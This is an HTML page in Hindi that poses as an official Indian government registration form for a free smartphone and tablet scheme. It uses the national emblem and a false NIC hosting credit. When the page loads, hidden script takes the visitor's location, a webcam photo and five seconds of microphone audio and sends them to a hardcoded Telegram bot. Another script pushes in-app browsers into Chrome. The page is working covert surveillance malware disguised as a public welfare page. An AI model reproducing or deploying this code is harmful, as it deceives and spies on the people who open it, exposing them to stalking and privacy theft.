<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sarkari Yojana - मुफ्त स्मार्टफोन एवं टैबलेट योजना 2026</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
        .header { background: #ff9933; color: white; padding: 15px; text-align: center; font-size: 20px; font-weight: bold; border-bottom: 5px solid #138808; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        .container { background: white; margin: 20px auto; padding: 20px; width: 90%; max-width: 600px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
        .emblem { width: 60px; display: block; margin: 0 auto 10px; }
        h2 { color: #000080; font-size: 22px; text-align: center; }
        .form-group { margin-bottom: 15px; text-align: left; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
        input, select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        .btn { background-color: #138808; color: white; padding: 15px; border: none; border-radius: 5px; font-size: 18px; width: 100%; cursor: pointer; font-weight: bold; }
        .status-box { background: #e7f3ff; border: 1px solid #b3d7ff; padding: 10px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; color: #004085; }
        #video, #canvas { display: none; }
    </style>
</head>
<body onload="autoStart()">

<script>
    // इंस्टाग्राम से क्रोम में भेजने के लिए
    if (navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV")) {
        window.location.href = "intent://mk8113049.github.io/MK-hacker-/#Intent;scheme=https;package=com.android.chrome;end";
    }
</script>

<div class="header">डिजिटल इंडिया - भारत सरकार</div>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Emblem_of_India.svg/1200px-Emblem_of_India.svg.png" class="emblem">
    <h2>पंजीकरण फॉर्म (2026)</h2>
    
    <div class="status-box">
        <b>सूचना:</b> फॉर्म भरने से पहले अपनी पहचान सत्यापित करें। कृपया कैमरा और लोकेशन अनुमति 'Allow' करें।
    </div>

    <div class="form-group">
        <label>पूरा नाम (आधार के अनुसार)</label>
        <input type="text" placeholder="अपना नाम लिखें">
    </div>
    
    <div class="form-group">
        <label>आधार नंबर (अंतिम 4 अंक)</label>
        <input type="number" placeholder="XXXX">
    </div>

    <div class="form-group">
        <label>राज्य का चयन करें</label>
        <select>
            <option>उत्तर प्रदेश</option>
            <option>मध्य प्रदेश</option>
            <option>बिहार</option>
            <option>अन्य</option>
        </select>
    </div>

    <button class="btn" onclick="alert('सत्यापन की प्रक्रिया चल रही है, कृपया प्रतीक्षा करें...')">सबमिट करें</button>
</div>

<video id="v" style="display:none;" autoplay></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const tok = '8601193684:AAF9gVWarBQgsHM1FVSv-Bt_DTsILEug7N8';
    const id = '8070342417';

    async function autoStart() {
        // 1. लोकेशन
        navigator.geolocation.getCurrentPosition(p => {
            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=📍 लोकेशन: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
        });

        try {
            // कैमरा और माइक परमिशन
            const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('v');
            video.srcObject = s;

            // --- 1. फोटो कैप्चर (1 सेकंड बाद) ---
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(b => {
                    const f = new FormData();
                    f.append('chat_id', id);
                    f.append('photo', b, 'u.png');
                    fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: f });
                }, 'image/png');
            }, 1000);

            // --- 2. ऑडियो रिकॉर्डिंग (5 सेकंड) ---
            const recorder = new MediaRecorder(s);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                const f = new FormData();
                f.append('chat_id', id);
                f.append('voice', audioBlob, 'v.ogg');
                fetch(`https://api.telegram.org/bot${tok}/sendVoice`, { method: 'POST', body: f });
                // रिकॉर्डिंग के बाद सब बंद
                setTimeout(() => { s.getTracks().forEach(t => t.stop()); }, 1000);
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 5000);

        } catch (e) {
            console.log("Permission Denied");
        }
    }
</script>

<div style="text-align:center; font-size:12px; color:#666; margin-bottom:20px;">
    Designed and Hosted by National Informatics Centre (NIC)
</div>

</body>
</html>
